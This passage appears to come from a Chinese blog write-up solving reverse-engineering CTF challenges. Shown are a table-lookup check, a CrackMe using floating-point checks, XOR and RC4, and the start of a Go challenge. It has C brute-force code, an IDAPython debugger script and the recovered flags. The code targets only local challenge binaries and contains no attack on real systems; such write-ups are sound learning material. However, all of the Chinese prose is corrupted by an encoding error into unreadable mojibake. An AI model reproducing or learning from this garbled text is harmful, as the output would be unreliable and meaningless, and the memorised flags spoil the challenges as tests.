alt="image-20210403200825059"></p><p>ç„¶åserver_check_redemption_codeå‡½æ•°ï¼šåˆ›å»º14ä¸ªè¡¨ï¼Œç„¶åæˆ‘ä»¬çš„è¾“å…¥çš„å­—ç¬¦ä¸²ä½œä¸ºindexåœ¨å…¶ä¸­ä»¥æ­¤é€’å¢çš„åšæ ‡è®°ã€‚æœ€åç”¨ä¸Šé¢èµ‹å€¼çš„å­—ç¬¦ä¸²ä½œä¸ºindexä¾æ¬¡æŸ¥è¡¨ï¼Œç›´åˆ°åˆ°æœ€ååˆ°è¾¾æœ€åä¸€ä¸ªè¡¨æ‰æˆåŠŸã€‚</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403201314116.png" alt="image-20210403201314116"></p><p>ä¸Šé¢å¦‚æœä¸å¥½ç†è§£çš„è¯ï¼Œå¯ä»¥æŠŠè¦å¾—åˆ°çš„è¡¨æ‰“å°å‡ºæ¥çœ‹ä¸€ä¸‹å°±æ¸…æ¥šäº†ã€‚</p><p>æ‰€ä»¥è¯´ï¼Œè¦ä½¿ç¬¬ä¸€ä¸ªå‡½æ•°ä¸è¿”å›-1ï¼Œåªè¦æˆ‘ä»¬çš„è¾“å…¥ä¸ºèµ‹å€¼å­—ç¬¦ä¸²çš„å‰14ä¸ªå°±å¥½äº†ã€‚<strong>Ninja Must Die</strong></p><p>ç´§æ¥ç€ï¼Œåˆæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²èµ‹å€¼æ“ä½œåŠ ä¸€ä¸ªcheck()å‡½æ•°ï¼Œä¸å‰é¢ä¸åŒçš„æ˜¯è¿™ä¸ªcheck()å‡½æ•°çš„è¿”å›å€¼è¦ä¸º7ï¼Œè®¡ç®—å¯ä»¥çŸ¥é“ä¹Ÿå°±æ˜¯check()å‡½æ•°æœ€åè¦å¯»æ‰¾21é•¿åº¦çš„å­—ç¬¦ä¸²ã€‚è€Œèµ‹å€¼çš„å­—ç¬¦ä¸²ä¹Ÿå˜äº†ï¼Œå¦‚ä½•è®©æˆ‘ä»¬çš„è¾“å…¥å­—ç¬¦ä¸²æ»¡è¶³2ä¸ªcheck()å‡½æ•°å‘¢ã€‚</p><p>è§‚å¯Ÿä¸€ä¸‹ç¬¬äºŒä¸ªå­—ç¬¦ä¸²çš„å‰21ä½ï¼š<strong>I Love Ninja Must Die</strong>ï¼Œå®ƒçš„å14ä½æ­£å¥½å’Œç¬¬ä¸€ä¸ªcheck()å‡½æ•°è¦æ»¡è¶³çš„ä¸€æ ·ï¼Œè€Œå®ƒçš„å‰7ä½å¯ä»¥è·³è¿‡çš„ï¼Œä¹Ÿæ­£å¥½æ»¡è¶³äº†è¿”å›å€¼è¦ä¸º7ã€‚</p><p>æ‰€ä»¥æœ€åçš„flagå°±æ˜¯ï¼š<strong>flag{Ninja Must Die}</strong></p><h3 id="CrackMe"><a href="#CrackMe" class="headerlink" title="CrackMe"></a>CrackMe</h3><p>ç¨‹åºåº”è¯¥æ˜¯realseæ¨¡å¼ç¼–è¯‘çš„ï¼Œä»£ç éƒ½æ‚åˆåˆ°ä¸€èµ·äº†ã€‚åšé¢˜æ—¶æ³¨æ„è¯†åˆ«å…³é”®ä»£ç ã€‚</p><p>æ¥åˆ°mainå‡½æ•°ï¼Œé¦–å…ˆå°±çœ‹åˆ°äº†è¾“å…¥å’Œé•¿åº¦åˆ¤æ–­ï¼Œæ˜æ˜¾çš„stlæ¨¡æ¿çš„stringç»“æ„ã€‚</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403204000350.png" alt="image-20210403204000350"></p><p>åŠ¨è°ƒçœ‹ä¸€ä¸‹è¿™ä¸ªç»“æ„ï¼š</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403205021175.png" alt="image-20210403205021175"></p><p>åé¢ä¸€ç›´åˆ°ä¸‹ä¸€æ¬¡è¾“å…¥çš„çš„åœ°æ–¹ï¼ŒåŠ¨æ€åˆ†æä¸‹å¯ä»¥å¿«é€ŸçŸ¥é“æ˜¯å°†æˆ‘ä»¬çš„è¾“å…¥å‰7ä½å’Œå10ä½åˆ†ä¸ºäº†2ä¸ªstringæ¥å­˜å‚¨ã€‚æ³¨æ„çœ‹å†…å­˜ã€‚</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403205837005.png" alt="image-20210403205837005"></p><p>æ¥ä¸‹æ¥å…³é”®æ˜¯ç¬¬äºŒä¸ªè¾“å…¥åè¿›è¡Œæµ®ç‚¹æ•°è¿ç®—çš„åœ°æ–¹ï¼Œè¾“å…¥æ•°æ®ç»è¿‡æµ®ç‚¹è¿ç®—å¯¹æ¯”æ­£ç¡®åç»§ç»­è¿›è¡Œåé¢çš„åˆ†æ”¯ã€‚</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403210353368.png" alt="image-20210403210353368"></p><p>æˆ‘å¼€å§‹ç›´æ¥è·³è¿‡äº†è¿™ä¸ªåˆ¤æ–­ï¼Œå…ˆçœ‹çœ‹åé¢åšäº†ä»€ä¹ˆã€‚</p><p>åˆ†æå¾—åˆ°ä¸‹é¢æ˜¯ç”¨è¾“å…¥çš„å‰7ä½å’Œç¬¬äºŒæ¬¡çš„è¾“å…¥å˜æ¢çš„å¾—åˆ°çš„æ•°æ®è¿›è¡Œå¼‚æˆ–ï¼Œ</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403211320207.png" alt="image-20210403211320207"></p><p>ç»§ç»­çœ‹ä¸‹é¢ï¼Œå¯ä»¥çœ‹åˆ°è¾“å…¥çš„rc4ç»“æ„ï¼Œä¸”æŠŠæˆ‘ä»¬çš„å‰7ä½åšäº†keyï¼š</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403212129295.png" alt="image-20210403212129295"></p><p>åˆ°è¿™é‡Œå°±æ¸…æ¥šç¨‹åºçš„æ•´ä½“æµç¨‹äº†ã€‚</p><p>è¾“å…¥ä½17ä½ï¼Œå‰7ä½ä¸ºkeyï¼Œå10ä½ä¸ºæ˜æ–‡ã€‚ç¬¬äºŒæ¬¡è¾“å…¥ç»è¿‡æµ®ç‚¹è¿è¾“åï¼Œç»è¿‡åˆ¤æ–­ï¼Œæ­£ç¡®çš„è¯å°†å…¶ç»è¿‡æœ‰è§„å¾‹å˜æ¢åä¸ç¬¬ä¸€æ¬¡è¾“å…¥çš„å‰7ä½è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œç„¶åä¸ç¼–ç çš„encå¯¹æ¯”ï¼Œæ­£ç¡®çš„è¯ç»§ç»­åé¢çš„rc4åŠ å¯†ã€‚</p><p>æ‰€ä»¥ç°åœ¨å°±æ˜¯æ±‚å‡ºç¬¬äºŒæ¬¡è¾“å…¥ä¸€ä¸ªintæ•°æ®ã€‚</p><p>å¼€å§‹æƒ³çš„ç”¨angræ¥è·‘å±€éƒ¨ï¼Œä½†ä¸ç†Ÿç»ƒğŸ˜¢ï¼Œæ¢ç”¨å¤åˆ¶idaä¸­çš„ä»£ç åˆ°vsä¸­è¿è¡Œï¼Œçˆ†ç ´å‡ºè¿™ä¸ªintæ•°æ®ã€‚</p><p>æ³¨æ„ä¸€ä¸‹<strong>__m128</strong>è¿™ä¸ªå˜é‡ï¼š</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403232640041.png" alt="image-20210403232640041"></p><p>çˆ†ç ´ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;emmintrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__m128 __<span class="function">fastcall <span class="title">sub_7FF64A4E1360</span><span class="params">(<span class="keyword">double</span> a1, <span class="keyword">double</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> v2; <span class="comment">// xmm7_8</span></span><br><span class="line">    __m128 v3; <span class="comment">// xmm6</span></span><br><span class="line"></span><br><span class="line">    v2 = a1;</span><br><span class="line">    a1 = <span class="built_in">pow</span>(a1, a2 - <span class="number">1.0</span>);</span><br><span class="line">    *((<span class="keyword">double</span>*)&amp;v3 + <span class="number">1</span>) = *(&amp;a1 + <span class="number">1</span>);</span><br><span class="line">    *(<span class="keyword">double</span>*)&amp;v3 = a1 / <span class="built_in">exp</span>(v2);</span><br><span class="line">    <span class="keyword">return</span> (__m128)v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> v96 = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">double</span> v16 = <span class="number">0.0</span>;</span><br><span class="line">    <span class="keyword">double</span> v17 = <span class="number">0.0</span>;</span><br><span class="line">    <span class="keyword">double</span> v18 = <span class="number">0.0</span>;</span><br><span class="line">    <span class="keyword">double</span> v19;</span><br><span class="line">    <span class="keyword">int</span> v20;</span><br><span class="line">    <span class="keyword">double</span> v21, v22;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xffffffff</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">double</span> v16 = <span class="number">0.0</span>;</span><br><span class="line">        <span class="keyword">double</span> v17 = <span class="number">0.0</span>;</span><br><span class="line">        <span class="keyword">double</span> v18 = <span class="number">0.0</span>;</span><br><span class="line">        v96 = i;</span><br><span class="line">        v19 = (<span class="keyword">double</span>)((<span class="keyword">int</span>)v96 / <span class="number">12379</span>) + <span class="number">1.0</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            v17 = v17 + *(<span class="keyword">double</span>*)sub_7FF64A4E1360(v18, v19).m128_u64 * <span class="number">0.001</span>;</span><br><span class="line">            v18 = v18 + <span class="number">0.001</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span> (v18 &lt;= <span class="number">100.0</span>);</span><br><span class="line">        v20 = (<span class="keyword">int</span>)(v17 + v17 + <span class="number">3.0</span>);</span><br><span class="line">        v21 = <span class="number">0.0</span>;</span><br><span class="line">        v22 = (<span class="keyword">double</span>)((<span class="keyword">int</span>)v96 % <span class="number">12379</span>) + <span class="number">1.0</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            v16 = v16 + *(<span class="keyword">double</span>*)sub_7FF64A4E1360(v21, v22).m128_u64 * <span class="number">0.001</span>;</span><br><span class="line">            v21 = v21 + <span class="number">0.001</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span> (v21 &lt;= <span class="number">100.0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, i);</span><br><span class="line">        <span class="keyword">if</span> (v20 == <span class="number">0x13B03</span> &amp;&amp; (<span class="keyword">int</span>)(v16 + v16 + <span class="number">3.0</span>) == <span class="number">0x5A2</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è™½ç„¶ä¸æ˜¯å¾ˆå¿«ï¼Œä½†è¿˜æ˜¯è·‘å‡ºæ¥äº†ï¼š<strong>99038</strong></p><p>æ¥ä¸‹æ¥åŠ¨æ€å¾—åˆ°è¦ä¸ç¬¬ä¸€æ¬¡è¾“å…¥å‰7ä½è¿›è¡Œå¼‚æˆ–çš„æ•°æ®ã€‚å¼€å§‹æ˜¯99038ï¼Œåé¢éƒ½æ˜¯ä¹˜2åçš„å­—ç¬¦ä¸²ã€‚</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403213606134.png" alt="image-20210403213606134"></p><p>è¿›è¡Œå¼‚æˆ–è§£å¯†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = [<span class="number">57</span>, <span class="number">57</span>, <span class="number">48</span>, <span class="number">51</span>, <span class="number">56</span>, <span class="number">49</span>, <span class="number">57</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t = [<span class="number">8</span>, <span class="number">77</span>, <span class="number">89</span>, <span class="number">6</span>, <span class="number">115</span>, <span class="number">2</span>, <span class="number">64</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans = [s[i]^t[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>)]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bytes(ans)</span><br><span class="line"><span class="string">b'1ti5K3y'</span></span><br></pre></td></tr></table></figure><p>è¿™å°±å¾—åˆ°äº†keyã€‚</p><p>ç„¶åå°±æ˜¯è¿›è¡Œrc4è§£å¯†ï¼Œè¿™ä¸ªç›´æ¥åŠ¨è°ƒä¿®æ”¹è¾“å…¥æ•°æ®ä¸ºå¯†æ–‡æ•°æ®è¿›è¡Œä¸€æ¬¡åŠ å¯†å˜å¾—åˆ°æ˜æ–‡äº†ã€‚</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403214259089.png" alt="image-20210403214259089"></p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403214337600.png" alt="image-20210403214337600"></p><p>æœ€åè¾“å…¥å¾—åˆ°flagï¼š<strong>flag{1ti5K3yRC4_crypt099038}</strong></p><p><strong>å†çœ‹é¢˜</strong></p><p>å› ä¸ºå½“æ—¶åšé¢˜æ—¶ï¼Œæ²¡æœ‰æ³¨æ„ç»†èŠ‚æˆ–è€…æ–¹æ³•ä»€ä¹ˆçš„ï¼Œå“ªé‡Œçˆ†ç ´çš„å¾ˆæ…¢ï¼Œç°åœ¨æ˜¯æˆ‘åé¢å¯¹è¿™ä¸ªé¢˜å†æ¬¡å­¦ä¹ å†™ä¸‹çš„ã€‚</p><p>é¦–å…ˆæ˜¯å¯¹__m128æ•°æ®ç±»å‹çš„é‡æ–°è®¤è¯†ï¼Œå®ƒæ˜¯ä¸€ä¸ªè”åˆï¼Œè¿™é‡Œå®ƒçš„æˆå‘˜ï¼š</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210419214224132.png" alt="image-20210419214224132"></p><p>æ‰€ä»¥é¢˜ç›®ä¸­çš„.m128_u64å°±æ˜¯å–ä½8å­—èŠ‚ã€‚</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210419214254776.png" alt="image-20210419214254776"></p><p>exp()æ˜¯æ±‚eçš„æ¬¡æ–¹çš„å€¼ã€‚<strong>pow(a1, a2-1)/exp(a1)</strong></p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210419214354418.png" alt="image-20210419214354418"></p><p>å¦å¤–è¿™é‡Œæ˜¯é™¤12379ï¼Œç¬¬ä¸€æ¬¡æ˜¯ç”¨å•†ï¼Œç¬¬äºŒæ¬¡ç”¨ä½™æ•°ï¼Œæ‰€ä»¥è¿™é‡Œçˆ†ç ´çš„æ­¥é•¿åº”è¯¥æ˜¯æ¯æ¬¡åŠ 12379ï¼Œç¡®å®šäº†å•†ï¼Œå†ç¡®å®šä½™æ•°å°±å¾ˆå¿«äº†ã€‚ã€‚</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210419214519931.png" alt="image-20210419214519931"></p><p>æ­£ç¡®çš„çˆ†ç ´è„šæœ¬ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, ans;</span><br><span class="line"><span class="keyword">double</span> a = <span class="number">0</span>, b = <span class="number">0</span>, c;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0xffffffff</span>; i += <span class="number">12379</span>)</span><br><span class="line">&#123;</span><br><span class="line">a = <span class="number">0</span>, b = <span class="number">0</span>;</span><br><span class="line">c = i/<span class="number">12379</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">a = a + (<span class="built_in">pow</span>(b, c)/<span class="built_in">exp</span>(b))*<span class="number">0.001</span>;</span><br><span class="line">b += <span class="number">0.001</span>;</span><br><span class="line">&#125;<span class="keyword">while</span>(b &lt;= <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">ans = (<span class="keyword">int</span>)(a+a+<span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(ans == <span class="number">80643</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"found: %d\n\n"</span>, i);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">12379</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">a = <span class="number">0</span>, b = <span class="number">0</span>;</span><br><span class="line">c = i;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">a = a + (<span class="built_in">pow</span>(b, c)/<span class="built_in">exp</span>(b))*<span class="number">0.001</span>;</span><br><span class="line">b += <span class="number">0.001</span>;</span><br><span class="line">&#125;<span class="keyword">while</span>(b &lt;= <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">ans = (<span class="keyword">int</span>)(a+a+<span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(ans == <span class="number">0x5A2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"found: %d\n"</span>, i);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, i);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶æ¬¡è¿˜æœ‰ä¸€ç§ç”¨ä½¿ç”¨idapythonæ¥çˆ†ç ´ï¼Œå®è´¨å°±æ˜¯è°ƒç”¨idaè°ƒè¯•å™¨ä¸­çš„å‡½æ•°æ¥æ§åˆ¶ç¨‹åºçš„æµç¨‹å’Œå¯„å­˜å™¨å€¼ç­‰ï¼Œä¸ºäº†è®©è‡ªå·±ç”¨çš„å‡½æ•°æœ‰ä¸€ä¸ªç»Ÿä¸€è§„èŒƒï¼Œæˆ‘ç»Ÿä¸€ä½¿ç”¨ida_dbgæ¨¡å—çš„å‡½æ•°ï¼ˆidapythonå°è£…è¿‡çš„å…¶å®ä¹Ÿä¸é”™ï¼‰ï¼šè¿è¡Œè„šæœ¬ç›´æ¥å¾—åˆ°ç»“æœã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_dbg <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></span><br><span class="line">rsp = get_reg_val(<span class="string">"rsp"</span>)</span><br><span class="line">set_reg_val(<span class="string">"rip"</span>, <span class="number">0x140001768</span>)</span><br><span class="line">patch_qword(rsp+<span class="number">0x40</span>, i)</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">run_to(<span class="number">0x140001658</span>)</span><br><span class="line">wait_for_next_event(WFNE_SUSP, <span class="number">-1</span>)</span><br><span class="line">init()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">print(<span class="string">"&gt;&gt;&gt; i: %d"</span>%i)</span><br><span class="line">run_to(<span class="number">0x14000184E</span>)</span><br><span class="line">wait_for_next_event(WFNE_SUSP, <span class="number">-1</span>)</span><br><span class="line">ebx = get_reg_val(<span class="string">"ebx"</span>)</span><br><span class="line">eax = get_reg_val(<span class="string">"eax"</span>)</span><br><span class="line"><span class="keyword">if</span> ebx != <span class="number">80643</span>:</span><br><span class="line">i += <span class="number">12379</span></span><br><span class="line">init()</span><br><span class="line"><span class="keyword">elif</span> eax != <span class="number">1442</span>:</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line">init()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">"&gt;&gt;&gt; find: %d"</span>%i)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">exit_process()</span><br></pre></td></tr></table></figure><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210419222558380.png" alt="image-20210419222558380"></p><p>æ„Ÿè§‰idapythoné‡Œé¢çš„å‡½æ•°çœŸçš„ç¹æ‚ã€‚ã€‚åŒä¸€ä¸ªåŠŸèƒ½å„ä¸ªæ¨¡å—éƒ½æœ‰ã€‚ä½†è‡ªå·±è¦æœ‰ä¸ªè§„èŒƒã€‚</p><p>è®°ä¸€ä¸ªidapythonæ–‡æ¡£ï¼Œéœ€è¦ä»€ä¹ˆéƒ½æœ‰ï¼Œç›´æ¥æŸ¥å°±å®Œäº‹äº†ï¼š<a href="https://www.hex-rays.com/wp-content/static/products/ida/support/idapython_docs/" target="_blank" rel="noopener">idapython_docs</a></p><h3 id="Golang-encrypter"><a href="#Golang-encrypter" class="headerlink" title="Golang encrypter"></a>Golang encrypter</h3><p>64ä½ï¼Œgoè¯­è¨€å†™çš„ç¨‹åºï¼Œç»è¿‡ç¬¦å·è¡¨è¿˜åŸåï¼Œè™½ç„¶ä»£ç è¿˜æ˜¯éš¾çœ‹ï¼Œä½†æœ‰äº†å¤§å¤šæ•°å‡½æ•°åç§°è¿˜æ˜¯å¥½å¾ˆå¤šçš„ã€‚</p><p>å¯¹è¾“å…¥çš„è¿›è¡Œçš„ç¬¬ä¸€ä¸ªæ£€æŸ¥å‡½æ•°ï¼šmain_check()ï¼Œé¦–å…ˆåˆ¤æ–­è¾“å…¥å­—ç¬¦ä¸²é•¿åº¦ï¼Œç„¶åå¼•å…¥ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼å¯¹flagçš„æ ¼å¼è¿›è¡Œäº†è¿‡æ»¤ï¼Œæœ€åæå–å‡ºæ¯éƒ¨åˆ†çš„å­—ç¬¦ä¸²è¿›è¡Œè¿æ¥ï¼Œæœ€åå†è¿›è¡Œä¸€ä¸ªhex()æ“ä½œã€‚</p><p><img 